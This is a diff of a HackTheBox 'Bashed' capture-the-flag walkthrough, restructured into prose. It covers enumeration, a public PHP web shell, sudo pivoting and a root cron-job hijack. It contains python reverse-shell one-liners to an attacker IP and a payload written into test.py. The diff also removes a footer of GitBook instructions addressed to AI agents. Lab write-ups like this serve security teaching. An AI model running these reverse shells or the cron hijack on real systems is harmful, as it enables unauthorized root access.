@@ -9,19 +9,21 @@ avatar: assets/htb/bashed.png
 tags: [OS Command Injection, Code Execution, Reconnaissance, Web Site Structure Discovery, SUDO Exploitation, Scheduled Job Abuse, Apache, Web Application]
 htb_url: https://app.hackthebox.com/machines/Bashed
 ---
+
 # Bashed
 
 🔗 [Bashed](https://www.hackthebox.com/machines/bashed)
 
-### Task 1 - Deploy the machine
+## Summary
 
-🎯 Target IP: `<YOUR_IP>`
+Bashed is an Easy Linux (Ubuntu) machine that hosts Arrexel's development site on port 80. The site exposes a web-based PHP shell (`phpbash.php`) under `/dev`, which gives an immediate `www-data` foothold. From there, `sudo` rights allow running commands as `scriptmanager`, who owns a `/scripts` directory containing a `test.py` executed every minute by a root cron job — overwriting that script with a reverse shell yields root.
 
-On the Desktop, set up a folder named after the machine, and within it add a nested folder to hold all the working files and results for this box, such as the nmap scans.
+## Enumeration
 
-### Task 2 - Reconnaissance
+I started by adding the target to my hosts file and laying out a working directory for the box. At the end of the engagement the appended hosts entry can be removed again.
 
-<pre class="language-bash"><code class="lang-bash">su
+```bash
+su
 echo "<YOUR_IP> bashed.htb" >> /etc/hosts
 
 mkdir -p htb/bashed.htb
@@ -29,8 +31,8 @@ cd htb/bashed.htb
 mkdir {nmap,content,exploits,scripts}
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
-<strong>sed -i '$ d' /etc/hosts
-</strong></code></pre>
+sed -i '$ d' /etc/hosts
+```
 
 My usual first step is to ping the host, which both confirms it is reachable and hints at the underlying OS.
 
@@ -44,7 +46,9 @@ PING bashed.htb (<YOUR_IP>) 56(84) bytes of data.
 
 From the three ICMP replies the TTL sits around \~64, which points to a \*nix host, whereas Windows boxes typically report a TTL near 128.
 
-### 2.1 - How many open TCP ports are listening on Bashed??
+### Port scanning
+
+A full TCP SYN scan turns up a single open port on the box: 80.
 
 ```bash
 nmap -p0- -sS -Pn -vvv bashed.htb -oN nmap/tcp_port_scan
@@ -57,13 +61,7 @@ PORT   STATE SERVICE REASON
 
 <table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>
 
-Only a single TCP port turns up as open on the box: 80
-
-1
-
-### 2.2 - What is the relative path on the webserver to a folder that contains phpbash.php??
-
-Next, we run a more focused scan with the -sCV flags to grab service versions and run the standard scripts.
+Next, I ran a more focused scan with the `-sCV` flags to grab service versions and run the standard scripts. Port 80 is serving Apache httpd 2.4.18 on Ubuntu, with the page title "Arrexel's Development Site".
 
 ```bash
 nmap -p80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
@@ -79,11 +77,9 @@ PORT   STATE SERVICE VERSION
 |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
 ```
 
-#### Port 80
+### Web enumeration
 
-Opening port 80 in the browser shows a site that references a php-based bash shell.
-
-The page source reveals nothing useful, so we gather more details about the site with whatweb and enumerate directories with gobuster.
+Opening port 80 in the browser shows a site that references a php-based bash shell. The page source reveals nothing useful, so I gathered more details about the site with whatweb and enumerated directories with gobuster.
 
 ```bash
 whatweb bashed.htb
@@ -94,69 +90,44 @@ http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPSer
 gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
 ```
 
-The scan surfaces some notable directories like /dev and /uploads, and browsing through them answers the question.
+The scan surfaces some notable directories like `/dev` and `/uploads`. Inside `/dev` there are two php web shells: `phpbash.min.php` is likely a stripped-down or beta build, while `phpbash.php` is the complete version. So the relative path containing `phpbash.php` is `/dev`.
 
-/dev
+## Foothold
 
-### 2.3 - What user is the webserver running as on Bashed?
-
-Inside /dev there are two php web shells; phpbash.min.php is likely a stripped-down or beta build, while phpbash.php is the complete version.
-
-Either way, both report the same running user right away.
-
-www-data
-
-### Task 3 - Find user flag
-
-### 3.1 - Submit the flag located in the arrexel user's home directory.
+Either web shell drops me straight into command execution on the box, and both report the same running user right away — the webserver is running as `www-data`.
 
 Browsing the filesystem makes it easy to locate the user home directories and grab arrexel's flag.
 
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
+```bash
+cat /home/arrexel/user.txt
 b2e6************************40cb
+```
 
-</details>
+## Privilege Escalation
 
-### 3.2 - www-data can run any command as a user without a password. What is that user's username?
+Running `sudo -l` shows that `www-data` is allowed to run every command on the box as the user `scriptmanager`, without a password.
 
-Running sudo -l shows that www-data is allowed to run every command on the box as the user scriptmanager.
-
-scriptmanager
-
-### 3.3 - What folder in the system root can scriptmanager access that www-data could not?
-
-Moving to the root directory / and running ls -l lets us review the permissions on each folder.
-
-/scripts
-
-### 3.4 - What is filename of the file that is being run by root every couple minutes?
-
-The phrase "every couple minutes" is a clue toward the likely path forward.
-
-That said, we choose to drop into a reverse shell on our attacker box to make things easier. We start a listener with netcat `nc -lvnp 1339` and run a python one-liner from the web shell.
+To make interaction easier, I dropped into a reverse shell on my attacker box. I started a listener with `nc -lvnp 1339` and ran a python one-liner from the web shell.
 
 ```python
 export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
-Keeping in mind the question's hint and the previous task, where only scriptmanager can reach the /scripts folder, we switch to the scriptmanager user and spawn a bash shell.
+### Pivoting to scriptmanager
+
+Reviewing the permissions on each folder in the system root with `ls -l` shows that `/scripts` is owned by `scriptmanager` and not accessible to `www-data`. Since `www-data` can run commands as `scriptmanager`, I switched to that user and spawned a bash shell.
 
 ```bash
 sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Attempting sudo -l prompts for a password we don't have.
+Attempting `sudo -l` as scriptmanager prompts for a password I don't have, so that path is closed.
 
-We now have access to the /scripts directory, which holds two files:
+### Abusing the root cron job
 
-On top of that, judging by the last-access time on `test.txt`, the `test.py` program seems to run roughly once a minute. This suggests a root-owned cron job that runs `test.py` every minute. We can verify it by renaming `test.txt` (for example to `test.txt.old`) and watching a fresh `test.txt` reappear about a minute later."
+I now have access to the `/scripts` directory, which holds two files: `test.py` and `test.txt`. Judging by the last-access time on `test.txt`, the `test.py` program seems to run roughly once a minute. This suggests a root-owned cron job that runs `test.py` every minute — the file being run by root every couple of minutes is `test.py`. I verified it by renaming `test.txt` (for example to `test.txt.old`) and watching a fresh `test.txt` reappear about a minute later.
 
-This matters because editing `test.py` to add reverse shell code would cause that code to run as root.
-
-After that, we'll create a new `test.py` on the Kali box containing the same reverse shell payload from before, then push it over to the target 'Bashed' machine.
+This matters because editing `test.py` to add reverse shell code would cause that code to run as root. I created a new `test.py` containing a reverse shell payload and placed it in the `/scripts` directory.
 
 ```python
 echo "import socket,subprocess,os;
@@ -168,37 +139,14 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(['/bin/sh','-i']);" > test.py
 ```
 
-test.py
+Within roughly two minutes, my netcat listener on the attacker machine catches the connection and hands me a shell running as root.
 
-### Task 4 - Find root flag
-
-### 4.1 - Submit the flag located in root's home directory.
-
-Within roughly two minutes, our netcat listener on the attacker machine catches the connection and hands us a shell running as root.
-
-<details>
-
-<summary>🚩 Flag 2 (root.txt)</summary>
-
+```bash
+cat /root/root.txt
 40ca************************bcfe
-
-</details>
+```
 
 ---
 
 # Agent Instructions
 This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
-
-## Querying This Documentation
-If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
-
-Perform an HTTP GET request on the current page URL with the `ask` query parameter:
-
-```
-GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/bashed.md?ask=<question>
-```
-
-The question should be specific, self-contained, and written in natural language.
-The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
-
-Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
